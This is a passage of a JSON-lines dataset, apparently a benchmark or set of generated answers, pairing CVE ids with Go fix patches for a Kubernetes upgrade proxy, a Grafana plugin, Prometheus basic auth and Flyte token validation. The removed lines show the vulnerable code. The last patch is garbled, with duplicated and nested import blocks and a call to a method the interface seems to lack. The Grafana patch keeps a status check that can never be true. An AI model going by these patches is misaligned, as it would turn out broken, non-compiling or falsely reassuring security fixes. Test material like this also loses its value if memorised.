}\n+        if len(headerBytes) > len(rawResponse) {\n+                // we read beyond the bytes stored in rawResponse, update rawResponse to the full set of bytes read from the backend\n+                rawResponse = headerBytes\n+        }\n+\n+        // Once the connection is hijacked, the ErrorResponder will no longer work, so\n+        // hijacking should be the last step in the upgrade.\n+        requestHijacker, ok := w.(http.Hijacker)\n+        if !ok {\n+                klog.V(6).Infof(\"Unable to hijack response writer: %T\", w)\n+                h.Responder.Error(w, req, fmt.Errorf(\"request connection cannot be hijacked: %T\", w))\n+                return true\n+        }\n+        requestHijackedConn, _, err := requestHijacker.Hijack()\n+        if err != nil {\n+                klog.V(6).Infof(\"Unable to hijack response: %v\", err)\n+                h.Responder.Error(w, req, fmt.Errorf(\"error hijacking connection: %v\", err))\n+                return true\n+        }\n+        defer requestHijackedConn.Close()\n+\n+        if backendHTTPResponse.StatusCode != http.StatusSwitchingProtocols {\n+                // If the backend did not upgrade, but is setting a Location header, it is a redirect\n+                if location := backendHTTPResponse.Header.Get(\"Location\"); len(location) > 0 {\n+                        // Do not forward redirects. Rewriting the scheme and host is not sufficient,\n+                        // because the backend could redirect to an entirely different path.\n+                        h.Responder.Error(w, req, fmt.Errorf(\"upgrade response indicates a redirect to %s\", location))\n+                        return true\n+                }\n+\n+                // If the backend did not upgrade the request, echo the response from the backend to the client and return, closing the connection.\n+                klog.V(6).Infof(\"Proxy upgrade error, status code %d\", backendHTTPResponse.StatusCode)\n+                // set read/write deadlines\n+                deadline := time.Now().Add(10 * time.Second)\n+                backendConn.SetReadDeadline(deadline)\n+                requestHijackedConn.SetWriteDeadline(deadline)\n+                // write the response to the client\n+                err := backendHTTPResponse.Write(requestHijackedConn)\n+                if err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n+                        klog.Errorf(\"Error proxying data from backend to client: %v\", err)\n+                }\n+                // Indicate we handled the request\n+                return true\n+        }\n+\n+        // Forward raw response bytes back to client.\n+        if len(rawResponse) > 0 {\n+                klog.V(6).Infof(\"Writing %d bytes to hijacked connection\", len(rawResponse))\n+                if _, err = requestHijackedConn.Write(rawResponse); err != nil {\n+                        utilruntime.HandleError(fmt.Errorf(\"Error proxying response from backend to client: %v\", err))\n+                }\n+        }\n+\n+        // Proxy the connection. This is bidirectional, so we need a goroutine\n+        // to copy in each direction. Once one side of the connection exits, we\n+        // exit the function which performs cleanup and in the process closes\n+        // the other half of the connection in the defer.\n+        writerComplete := make(chan struct{})\n+        readerComplete := make(chan struct{})\n+\n+        go func() {\n+                var writer io.WriteCloser\n+                if h.MaxBytesPerSec > 0 {\n+                        writer = flowrate.NewWriter(backendConn, h.MaxBytesPerSec)\n+                } else {\n+                        writer = backendConn\n+                }\n+                _, err := io.Copy(writer, requestHijackedConn)\n+                if err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n+                        klog.Errorf(\"Error proxying data from client to backend: %v\", err)\n+                }\n+                close(writerComplete)\n+        }()\n+\n+        go func() {\n+                var reader io.ReadCloser\n+                if h.MaxBytesPerSec > 0 {\n+                        reader = flowrate.NewReader(backendConn, h.MaxBytesPerSec)\n+                } else {\n+                        reader = backendConn\n+                }\n+                _, err := io.Copy(requestHijackedConn, reader)\n+                if err != nil && !strings.Contains(err.Error(), \"use of closed network connection\") {\n+                        klog.Errorf(\"Error proxying data from backend to client: %v\", err)\n+                }\n+                close(readerComplete)\n+        }()\n+\n+        // Wait for one half the connection to exit. Once it does the defer will\n+        // clean up the other half of the connection.\n+        select {\n+        case <-writerComplete:\n+        case <-readerComplete:\n+        }\n+        klog.V(6).Infof(\"Disconnecting from backend proxy %s\\n  Headers: %v\", &location, clone.Header)\n+\n+        return true\n }\n \n func (h *UpgradeAwareHandler) DialForUpgrade(req *http.Request) (net.Conn, error) {\n-\tif h.UpgradeTransport == nil {\n-\t\treturn dial(req, h.Transport)\n-\t}\n-\tupdatedReq, err := h.UpgradeTransport.WrapRequest(req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\treturn dial(updatedReq, h.UpgradeTransport)\n+        if h.UpgradeTransport == nil {\n+                return dial(req, h.Transport)\n+        }\n+        updatedReq, err := h.UpgradeTransport.WrapRequest(req)\n+        if err != nil {\n+                return nil, err\n+        }\n+        return dial(updatedReq, h.UpgradeTransport)\n }\n \n // getResponseCode reads a http response from the given reader, returns the response,\n // the bytes read from the reader, and any error encountered\n func getResponse(r io.Reader) (*http.Response, []byte, error) {\n-\trawResponse := bytes.NewBuffer(make([]byte, 0, 256))\n-\t// Save the bytes read while reading the response headers into the rawResponse buffer\n-\tresp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)\n-\tif err != nil {\n-\t\treturn nil, nil, err\n-\t}\n-\t// return the http response and the raw bytes consumed from the reader in the process\n-\treturn resp, rawResponse.Bytes(), nil\n+        rawResponse := bytes.NewBuffer(make([]byte, 0, 256))\n+        // Save the bytes read while reading the response headers into the rawResponse buffer\n+        resp, err := http.ReadResponse(bufio.NewReader(io.TeeReader(r, rawResponse)), nil)\n+        if err != nil {\n+                return nil, nil, err\n+        }\n+        // return the http response and the raw bytes consumed from the reader in the process\n+        return resp, rawResponse.Bytes(), nil\n }\n \n // dial dials the backend at req.URL and writes req to it.\n func dial(req *http.Request, transport http.RoundTripper) (net.Conn, error) {\n-\tconn, err := dialURL(req.Context(), req.URL, transport)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error dialing backend: %v\", err)\n-\t}\n+        conn, err := dialURL(req.Context(), req.URL, transport)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error dialing backend: %v\", err)\n+        }\n \n-\tif err = req.Write(conn); err != nil {\n-\t\tconn.Close()\n-\t\treturn nil, fmt.Errorf(\"error sending request: %v\", err)\n-\t}\n+        if err = req.Write(conn); err != nil {\n+                conn.Close()\n+                return nil, fmt.Errorf(\"error sending request: %v\", err)\n+        }\n \n-\treturn conn, err\n+        return conn, err\n }\n \n func (h *UpgradeAwareHandler) defaultProxyTransport(url *url.URL, internalTransport http.RoundTripper) http.RoundTripper {\n-\tscheme := url.Scheme\n-\thost := url.Host\n-\tsuffix := h.Location.Path\n-\tif strings.HasSuffix(url.Path, \"/\") && !strings.HasSuffix(suffix, \"/\") {\n-\t\tsuffix += \"/\"\n-\t}\n-\tpathPrepend := strings.TrimSuffix(url.Path, suffix)\n-\trewritingTransport := &Transport{\n-\t\tScheme:       scheme,\n-\t\tHost:         host,\n-\t\tPathPrepend:  pathPrepend,\n-\t\tRoundTripper: internalTransport,\n-\t}\n-\treturn &corsRemovingTransport{\n-\t\tRoundTripper: rewritingTransport,\n-\t}\n+        scheme := url.Scheme\n+        host := url.Host\n+        suffix := h.Location.Path\n+        if strings.HasSuffix(url.Path, \"/\") && !strings.HasSuffix(suffix, \"/\") {\n+                suffix += \"/\"\n+        }\n+        pathPrepend := strings.TrimSuffix(url.Path, suffix)\n+        rewritingTransport := &Transport{\n+                Scheme:       scheme,\n+                Host:         host,\n+                PathPrepend:  pathPrepend,\n+                RoundTripper: internalTransport,\n+        }\n+        return &corsRemovingTransport{\n+                RoundTripper: rewritingTransport,\n+        }\n }\n \n // corsRemovingTransport is a wrapper for an internal transport. It removes CORS headers\n // from the internal response.\n // Implements pkg/util/net.RoundTripperWrapper\n type corsRemovingTransport struct {\n-\thttp.RoundTripper\n+        http.RoundTripper\n }\n \n var _ = utilnet.RoundTripperWrapper(&corsRemovingTransport{})\n \n func (rt *corsRemovingTransport) RoundTrip(req *http.Request) (*http.Response, error) {\n-\tresp, err := rt.RoundTripper.RoundTrip(req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tremoveCORSHeaders(resp)\n-\treturn resp, nil\n+        resp, err := rt.RoundTripper.RoundTrip(req)\n+        if err != nil {\n+                return nil, err\n+        }\n+        removeCORSHeaders(resp)\n+        return resp, nil\n }\n \n func (rt *corsRemovingTransport) WrappedRoundTripper() http.RoundTripper {\n-\treturn rt.RoundTripper\n+        return rt.RoundTripper\n }\n \n // removeCORSHeaders strip CORS headers sent from the backend\n // This should be called on all responses before returning\n func removeCORSHeaders(resp *http.Response) {\n-\tresp.Header.Del(\"Access-Control-Allow-Credentials\")\n-\tresp.Header.Del(\"Access-Control-Allow-Headers\")\n-\tresp.Header.Del(\"Access-Control-Allow-Methods\")\n-\tresp.Header.Del(\"Access-Control-Allow-Origin\")\n+        resp.Header.Del(\"Access-Control-Allow-Credentials\")\n+        resp.Header.Del(\"Access-Control-Allow-Headers\")\n+        resp.Header.Del(\"Access-Control-Allow-Methods\")\n+        resp.Header.Del(\"Access-Control-Allow-Origin\")\n }\n"}
{"cve":"CVE-2023-5122:0708", "fix_patch": "diff --git a/pkg/http_storage.go b/pkg/http_storage.go\nindex 1434126..63f141c 100644\n--- a/pkg/http_storage.go\n+++ b/pkg/http_storage.go\n@@ -1,122 +1,123 @@\n package main\n \n import (\n-\t\"context\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"strings\"\n-\n-\t\"github.com/grafana/grafana-plugin-sdk-go/backend\"\n-\t\"github.com/grafana/grafana-plugin-sdk-go/backend/httpclient\"\n-\t\"github.com/grafana/grafana-plugin-sdk-go/backend/log\"\n+        \"context\"\n+        \"fmt\"\n+        \"io\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"strings\"\n+\n+        \"github.com/grafana/grafana-plugin-sdk-go/backend\"\n+        \"github.com/grafana/grafana-plugin-sdk-go/backend/httpclient\"\n+        \"github.com/grafana/grafana-plugin-sdk-go/backend/log\"\n )\n \n type httpStorage struct {\n-\thttpClient     *http.Client\n-\tsettings       *backend.DataSourceInstanceSettings\n-\tcustomSettings dataSourceSettings\n-\tquery          dataSourceQuery\n+        httpClient     *http.Client\n+        settings       *backend.DataSourceInstanceSettings\n+        customSettings dataSourceSettings\n+        query          dataSourceQuery\n }\n \n func newHTTPStorage(ctx context.Context, instance *dataSourceInstance, query dataSourceQuery, logger log.Logger) (*httpStorage, error) {\n-\tcustomSettings, err := instance.Settings()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\thttpOptions, err := instance.settings.HTTPClientOptions(ctx)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\thttpClient, err := httpclient.New(httpOptions)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\treturn &httpStorage{\n-\t\thttpClient:     httpClient,\n-\t\tsettings:       &instance.settings,\n-\t\tcustomSettings: customSettings,\n-\t\tquery:          query,\n-\t}, nil\n+        customSettings, err := instance.Settings()\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        httpOptions, err := instance.settings.HTTPClientOptions(ctx)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        httpClient, err := httpclient.New(httpOptions)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        return &httpStorage{\n+                httpClient:     httpClient,\n+                settings:       &instance.settings,\n+                customSettings: customSettings,\n+                query:          query,\n+        }, nil\n }\n \n func (c *httpStorage) do() (*http.Response, error) {\n-\treq, err := newRequestFromQuery(c.settings, c.customSettings, c.query)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        req, err := newRequestFromQuery(c.settings, c.customSettings, c.query)\n+        if err != nil {\n+                return nil, err\n+        }\n \n-\treturn c.httpClient.Do(req)\n+        return c.httpClient.Do(req)\n }\n \n func (c *httpStorage) Open() (io.ReadCloser, error) {\n-\tresp, err := c.do()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+        resp, err := c.do()\n+        if err != nil {\n+                return nil, err\n+        }\n \n-\tif resp.StatusCode < 200 && resp.StatusCode >= 300 {\n-\t\treturn nil, fmt.Errorf(\"unexpected response status: %s\", resp.Status)\n-\t}\n+        if resp.StatusCode < 200 && resp.StatusCode >= 300 {\n+                return nil, fmt.Errorf(\"unexpected response status: %s\", resp.Status)\n+        }\n \n-\treturn resp.Body, nil\n+        return resp.Body, nil\n }\n \n func (c *httpStorage) Stat() error {\n-\tresp, err := c.do()\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdefer resp.Body.Close()\n+        resp, err := c.do()\n+        if err != nil {\n+                return err\n+        }\n+        defer resp.Body.Close()\n \n-\tif resp.StatusCode < 200 && resp.StatusCode >= 300 {\n-\t\treturn fmt.Errorf(\"unexpected response status: %s\", resp.Status)\n-\t}\n+        if resp.StatusCode < 200 && resp.StatusCode >= 300 {\n+                return fmt.Errorf(\"unexpected response status: %s\", resp.Status)\n+        }\n \n-\treturn nil\n+        return nil\n }\n \n func newRequestFromQuery(settings *backend.DataSourceInstanceSettings, customSettings dataSourceSettings, query dataSourceQuery) (*http.Request, error) {\n-\tu, err := url.Parse(settings.URL + query.Path)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tparams := make(url.Values)\n-\tfor _, p := range query.Params {\n-\t\tparams.Set(p[0], p[1])\n-\t}\n-\n-\t// Query params set by admin overrides params set by query editor.\n-\tvalues, err := url.ParseQuery(customSettings.QueryParams)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tfor k, v := range values {\n-\t\tparams[k] = v\n-\t}\n-\n-\tu.RawQuery = params.Encode()\n-\n-\tvar method string\n-\tif query.Method != \"\" {\n-\t\tmethod = query.Method\n-\t} else {\n-\t\tmethod = \"GET\"\n-\t}\n-\n-\treq, err := http.NewRequest(method, u.String(), strings.NewReader(query.Body))\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfor _, p := range query.Headers {\n-\t\treq.Header.Set(p[0], p[1])\n-\t}\n-\n-\treturn req, nil\n+        u, err := url.Parse(settings.URL)\n+        if err != nil {\n+                return nil, err\n+        }\n+        u = u.JoinPath(query.Path)\n+\n+        params := make(url.Values)\n+        for _, p := range query.Params {\n+                params.Set(p[0], p[1])\n+        }\n+\n+        // Query params set by admin overrides params set by query editor.\n+        values, err := url.ParseQuery(customSettings.QueryParams)\n+        if err != nil {\n+                return nil, err\n+        }\n+        for k, v := range values {\n+                params[k] = v\n+        }\n+\n+        u.RawQuery = params.Encode()\n+\n+        var method string\n+        if query.Method != \"\" {\n+                method = query.Method\n+        } else {\n+                method = \"GET\"\n+        }\n+\n+        req, err := http.NewRequest(method, u.String(), strings.NewReader(query.Body))\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        for _, p := range query.Headers {\n+                req.Header.Set(p[0], p[1])\n+        }\n+\n+        return req, nil\n }\n"}
{"cve":"CVE-2022-46146:0708", "fix_patch": "diff --git a/web/handler.go b/web/handler.go\nindex ae3ebc0..04befde 100644\n--- a/web/handler.go\n+++ b/web/handler.go\n@@ -16,40 +16,40 @@\n package web\n \n import (\n-\t\"encoding/hex\"\n-\t\"fmt\"\n-\t\"net/http\"\n-\t\"sync\"\n+        \"encoding/hex\"\n+        \"fmt\"\n+        \"net/http\"\n+        \"sync\"\n \n-\t\"github.com/go-kit/log\"\n-\t\"golang.org/x/crypto/bcrypt\"\n+        \"github.com/go-kit/log\"\n+        \"golang.org/x/crypto/bcrypt\"\n )\n \n // extraHTTPHeaders is a map of HTTP headers that can be added to HTTP\n // responses.\n // This is private on purpose to ensure consistency in the Prometheus ecosystem.\n var extraHTTPHeaders = map[string][]string{\n-\t\"Strict-Transport-Security\": nil,\n-\t\"X-Content-Type-Options\":    {\"nosniff\"},\n-\t\"X-Frame-Options\":           {\"deny\", \"sameorigin\"},\n-\t\"X-XSS-Protection\":          nil,\n-\t\"Content-Security-Policy\":   nil,\n+        \"Strict-Transport-Security\": nil,\n+        \"X-Content-Type-Options\":    {\"nosniff\"},\n+        \"X-Frame-Options\":           {\"deny\", \"sameorigin\"},\n+        \"X-XSS-Protection\":          nil,\n+        \"Content-Security-Policy\":   nil,\n }\n \n func validateUsers(configPath string) error {\n-\tc, err := getConfig(configPath)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tfor _, p := range c.Users {\n-\t\t_, err = bcrypt.Cost([]byte(p))\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\n-\treturn nil\n+        c, err := getConfig(configPath)\n+        if err != nil {\n+                return err\n+        }\n+\n+        for _, p := range c.Users {\n+                _, err = bcrypt.Cost([]byte(p))\n+                if err != nil {\n+                        return err\n+                }\n+        }\n+\n+        return nil\n }\n \n // validateHeaderConfig checks that the provided header configuration is correct.\n@@ -57,81 +57,81 @@ func validateUsers(configPath string) error {\n // well-defined enumerations.\n func validateHeaderConfig(headers map[string]string) error {\n HeadersLoop:\n-\tfor k, v := range headers {\n-\t\tvalues, ok := extraHTTPHeaders[k]\n-\t\tif !ok {\n-\t\t\treturn fmt.Errorf(\"HTTP header %q can not be configured\", k)\n-\t\t}\n-\t\tfor _, allowedValue := range values {\n-\t\t\tif v == allowedValue {\n-\t\t\t\tcontinue HeadersLoop\n-\t\t\t}\n-\t\t}\n-\t\tif len(values) > 0 {\n-\t\t\treturn fmt.Errorf(\"invalid value for %s. Expected one of: %q, but got: %q\", k, values, v)\n-\t\t}\n-\t}\n-\treturn nil\n+        for k, v := range headers {\n+                values, ok := extraHTTPHeaders[k]\n+                if !ok {\n+                        return fmt.Errorf(\"HTTP header %q can not be configured\", k)\n+                }\n+                for _, allowedValue := range values {\n+                        if v == allowedValue {\n+                                continue HeadersLoop\n+                        }\n+                }\n+                if len(values) > 0 {\n+                        return fmt.Errorf(\"invalid value for %s. Expected one of: %q, but got: %q\", k, values, v)\n+                }\n+        }\n+        return nil\n }\n \n type webHandler struct {\n-\ttlsConfigPath string\n-\thandler       http.Handler\n-\tlogger        log.Logger\n-\tcache         *cache\n-\t// bcryptMtx is there to ensure that bcrypt.CompareHashAndPassword is run\n-\t// only once in parallel as this is CPU intensive.\n-\tbcryptMtx sync.Mutex\n+        tlsConfigPath string\n+        handler       http.Handler\n+        logger        log.Logger\n+        cache         *cache\n+        // bcryptMtx is there to ensure that bcrypt.CompareHashAndPassword is run\n+        // only once in parallel as this is CPU intensive.\n+        bcryptMtx sync.Mutex\n }\n \n func (u *webHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n-\tc, err := getConfig(u.tlsConfigPath)\n-\tif err != nil {\n-\t\tu.logger.Log(\"msg\", \"Unable to parse configuration\", \"err\", err)\n-\t\thttp.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)\n-\t\treturn\n-\t}\n-\n-\t// Configure http headers.\n-\tfor k, v := range c.HTTPConfig.Header {\n-\t\tw.Header().Set(k, v)\n-\t}\n-\n-\tif len(c.Users) == 0 {\n-\t\tu.handler.ServeHTTP(w, r)\n-\t\treturn\n-\t}\n-\n-\tuser, pass, auth := r.BasicAuth()\n-\tif auth {\n-\t\thashedPassword, validUser := c.Users[user]\n-\n-\t\tif !validUser {\n-\t\t\t// The user is not found. Use a fixed password hash to\n-\t\t\t// prevent user enumeration by timing requests.\n-\t\t\t// This is a bcrypt-hashed version of \"fakepassword\".\n-\t\t\thashedPassword = \"$2y$10$QOauhQNbBCuQDKes6eFzPeMqBSjb7Mr5DUmpZ/VcEd00UAV/LDeSi\"\n-\t\t}\n-\n-\t\tcacheKey := hex.EncodeToString(append(append([]byte(user), []byte(hashedPassword)...), []byte(pass)...))\n-\t\tauthOk, ok := u.cache.get(cacheKey)\n-\n-\t\tif !ok {\n-\t\t\t// This user, hashedPassword, password is not cached.\n-\t\t\tu.bcryptMtx.Lock()\n-\t\t\terr := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(pass))\n-\t\t\tu.bcryptMtx.Unlock()\n-\n-\t\t\tauthOk = err == nil\n-\t\t\tu.cache.set(cacheKey, authOk)\n-\t\t}\n-\n-\t\tif authOk && validUser {\n-\t\t\tu.handler.ServeHTTP(w, r)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tw.Header().Set(\"WWW-Authenticate\", \"Basic\")\n-\thttp.Error(w, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n+        c, err := getConfig(u.tlsConfigPath)\n+        if err != nil {\n+                u.logger.Log(\"msg\", \"Unable to parse configuration\", \"err\", err)\n+                http.Error(w, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)\n+                return\n+        }\n+\n+        // Configure http headers.\n+        for k, v := range c.HTTPConfig.Header {\n+                w.Header().Set(k, v)\n+        }\n+\n+        if len(c.Users) == 0 {\n+                u.handler.ServeHTTP(w, r)\n+                return\n+        }\n+\n+        user, pass, auth := r.BasicAuth()\n+        if auth {\n+                hashedPassword, validUser := c.Users[user]\n+\n+                if !validUser {\n+                        // The user is not found. To prevent user enumeration, we always run bcrypt.\n+                        // This is a bcrypt-hashed version of \"fakepassword\".\n+                        u.bcryptMtx.Lock()\n+                        bcrypt.CompareHashAndPassword([]byte(\"$2y$10$QOauhQNbBCuQDKes6eFzPeMqBSjb7Mr5DUmpZ/VcEd00UAV/LDeSi\"), []byte(pass))\n+                        u.bcryptMtx.Unlock()\n+                } else {\n+                        cacheKey := hex.EncodeToString(append(append([]byte(user), []byte(hashedPassword)...), []byte(pass)...))\n+                        authOk, ok := u.cache.get(cacheKey)\n+                        if !ok {\n+                                // This user, hashedPassword, password is not cached.\n+                                u.bcryptMtx.Lock()\n+                                err := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(pass))\n+                                u.bcryptMtx.Unlock()\n+\n+                                authOk = err == nil\n+                                u.cache.set(cacheKey, authOk)\n+                        }\n+\n+                        if authOk {\n+                                u.handler.ServeHTTP(w, r)\n+                                return\n+                        }\n+                }\n+        }\n+\n+        w.Header().Set(\"WWW-Authenticate\", \"Basic\")\n+        http.Error(w, http.StatusText(http.StatusUnauthorized), http.StatusUnauthorized)\n }\n"}
{"cve":"CVE-2022-31145:0708", "fix_patch": "diff --git a/auth/authzserver/resource_server.go b/auth/authzserver/resource_server.go\nindex 78e89529..961cac73 100644\n--- a/auth/authzserver/resource_server.go\n+++ b/auth/authzserver/resource_server.go\n@@ -1,120 +1,135 @@\n package authzserver\n \n+import \"time\"\n+\n+import (\n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"fmt\"\n-\t\"io/ioutil\"\n-\t\"mime\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"strings\"\n-\n-\t\"k8s.io/apimachinery/pkg/util/sets\"\n-\n-\t\"github.com/flyteorg/flytestdlib/config\"\n-\n-\t\"github.com/coreos/go-oidc\"\n-\tauthConfig \"github.com/flyteorg/flyteadmin/auth/config\"\n-\t\"github.com/flyteorg/flyteadmin/auth/interfaces\"\n-\t\"github.com/flyteorg/flyteidl/gen/pb-go/flyteidl/service\"\n-\t\"golang.org/x/oauth2\"\n+\"context\"\n+\"encoding/json\"\n+\"fmt\"\n+\"io/ioutil\"\n+\"mime\"\n+\"net/http\"\n+\"net/url\"\n+\"strings\"\n+\"time\"\n+import \"time\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"fmt\"\n+        \"io/ioutil\"\n+        \"mime\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"strings\"\n+\"time\"\n+\"time\"\n+\n+        \"k8s.io/apimachinery/pkg/util/sets\"\n+\n+        \"github.com/flyteorg/flytestdlib/config\"\n+\n+        \"github.com/coreos/go-oidc\"\n+        authConfig \"github.com/flyteorg/flyteadmin/auth/config\"\n+        \"github.com/flyteorg/flyteadmin/auth/interfaces\"\n+        \"github.com/flyteorg/flyteidl/gen/pb-go/flyteidl/service\"\n+        \"golang.org/x/oauth2\"\n )\n \n // ResourceServer authorizes access requests issued by an external Authorization Server.\n type ResourceServer struct {\n-\tsignatureVerifier oidc.KeySet\n-\tallowedAudience   []string\n+        signatureVerifier oidc.KeySet\n+        allowedAudience   []string\n }\n \n func (r ResourceServer) ValidateAccessToken(ctx context.Context, expectedAudience, tokenStr string) (interfaces.IdentityContext, error) {\n-\traw, err := r.signatureVerifier.VerifySignature(ctx, tokenStr)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n+idToken, err := r.signatureVerifier.Verify(ctx, tokenStr)\n+if err != nil {\n+return nil, err\n+}\n \n-\tclaimsRaw := map[string]interface{}{}\n-\tif err = json.Unmarshal(raw, &claimsRaw); err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to unmarshal user info claim into UserInfo type. Error: %w\", err)\n-\t}\n+claimsRaw := map[string]interface{}{}\n+if err = idToken.Claims(&claimsRaw); err != nil {\n+return nil, fmt.Errorf(\"failed to unmarshal user info claim into UserInfo type. Error: %w\", err)\n+}\n \n-\treturn verifyClaims(sets.NewString(append(r.allowedAudience, expectedAudience)...), claimsRaw)\n+return verifyClaims(sets.NewString(append(r.allowedAudience, expectedAudience)...), claimsRaw)\n }\n \n func doRequest(ctx context.Context, req *http.Request) (*http.Response, error) {\n-\tclient := http.DefaultClient\n-\tif c, ok := ctx.Value(oauth2.HTTPClient).(*http.Client); ok {\n-\t\tclient = c\n-\t}\n-\treturn client.Do(req.WithContext(ctx))\n+        client := http.DefaultClient\n+        if c, ok := ctx.Value(oauth2.HTTPClient).(*http.Client); ok {\n+                client = c\n+        }\n+        return client.Do(req.WithContext(ctx))\n }\n \n func unmarshalResp(r *http.Response, body []byte, v interface{}) error {\n-\terr := json.Unmarshal(body, &v)\n-\tif err == nil {\n-\t\treturn nil\n-\t}\n-\tct := r.Header.Get(\"Content-Type\")\n-\tmediaType, _, parseErr := mime.ParseMediaType(ct)\n-\tif parseErr == nil && mediaType == \"application/json\" {\n-\t\treturn fmt.Errorf(\"got Content-Type = application/json, but could not unmarshal as JSON: %v\", err)\n-\t}\n-\treturn fmt.Errorf(\"expected Content-Type = application/json, got %q: %v\", ct, err)\n+        err := json.Unmarshal(body, &v)\n+        if err == nil {\n+                return nil\n+        }\n+        ct := r.Header.Get(\"Content-Type\")\n+        mediaType, _, parseErr := mime.ParseMediaType(ct)\n+        if parseErr == nil && mediaType == \"application/json\" {\n+                return fmt.Errorf(\"got Content-Type = application/json, but could not unmarshal as JSON: %v\", err)\n+        }\n+        return fmt.Errorf(\"expected Content-Type = application/json, got %q: %v\", ct, err)\n }\n \n func getJwksForIssuer(ctx context.Context, issuerBaseURL url.URL, customMetadataURL url.URL) (keySet oidc.KeySet, err error) {\n-\tissuerBaseURL.Path = strings.TrimSuffix(issuerBaseURL.Path, \"/\") + \"/\"\n-\tvar wellKnown *url.URL\n-\tif len(customMetadataURL.String()) > 0 {\n-\t\twellKnown = issuerBaseURL.ResolveReference(&customMetadataURL)\n-\t} else {\n-\t\twellKnown = issuerBaseURL.ResolveReference(oauth2MetadataEndpoint)\n-\t}\n-\n-\treq, err := http.NewRequest(http.MethodGet, wellKnown.String(), nil)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tresp, err := doRequest(ctx, req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tdefer resp.Body.Close()\n-\n-\tbody, err := ioutil.ReadAll(resp.Body)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"unable to read response body: %v\", err)\n-\t}\n-\n-\tif resp.StatusCode != http.StatusOK {\n-\t\treturn nil, fmt.Errorf(\"%s: %s\", resp.Status, body)\n-\t}\n-\n-\tp := &service.OAuth2MetadataResponse{}\n-\terr = unmarshalResp(resp, body, &p)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to decode provider discovery object: %v\", err)\n-\t}\n-\n-\treturn oidc.NewRemoteKeySet(ctx, p.JwksUri), nil\n+        issuerBaseURL.Path = strings.TrimSuffix(issuerBaseURL.Path, \"/\") + \"/\"\n+        var wellKnown *url.URL\n+        if len(customMetadataURL.String()) > 0 {\n+                wellKnown = issuerBaseURL.ResolveReference(&customMetadataURL)\n+        } else {\n+                wellKnown = issuerBaseURL.ResolveReference(oauth2MetadataEndpoint)\n+        }\n+\n+        req, err := http.NewRequest(http.MethodGet, wellKnown.String(), nil)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        resp, err := doRequest(ctx, req)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        defer resp.Body.Close()\n+\n+        body, err := ioutil.ReadAll(resp.Body)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"unable to read response body: %v\", err)\n+        }\n+\n+        if resp.StatusCode != http.StatusOK {\n+                return nil, fmt.Errorf(\"%s: %s\", resp.Status, body)\n+        }\n+\n+        p := &service.OAuth2MetadataResponse{}\n+        err = unmarshalResp(resp, body, &p)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to decode provider discovery object: %v\", err)\n+        }\n+\n+        return oidc.NewRemoteKeySet(ctx, p.JwksUri), nil\n }\n \n // NewOAuth2ResourceServer initializes a new OAuth2ResourceServer.\n func NewOAuth2ResourceServer(ctx context.Context, cfg authConfig.ExternalAuthorizationServer, fallbackBaseURL config.URL) (ResourceServer, error) {\n-\tu := cfg.BaseURL\n-\tif len(u.String()) == 0 {\n-\t\tu = fallbackBaseURL\n-\t}\n-\n-\tverifier, err := getJwksForIssuer(ctx, u.URL, cfg.MetadataEndpointURL.URL)\n-\tif err != nil {\n-\t\treturn ResourceServer{}, err\n-\t}\n-\n-\treturn ResourceServer{\n-\t\tsignatureVerifier: verifier,\n-\t\tallowedAudience:   cfg.AllowedAudience,\n-\t}, nil\n+        u := cfg.BaseURL\n+        if len(u.String()) == 0 {\n+                u = fallbackBaseURL\n+        }\n+\n+        verifier, err := getJwksForIssuer(ctx, u.URL, cfg.MetadataEndpointURL.URL)\n+        if err != nil {\n+                return ResourceServer{}, err\n+        }\n+\n+        return ResourceServer{\n+                signatureVerifier: verifier,\n+                allowedAudience:   cfg.AllowedAudience,\n+        }, nil\n }\n"}
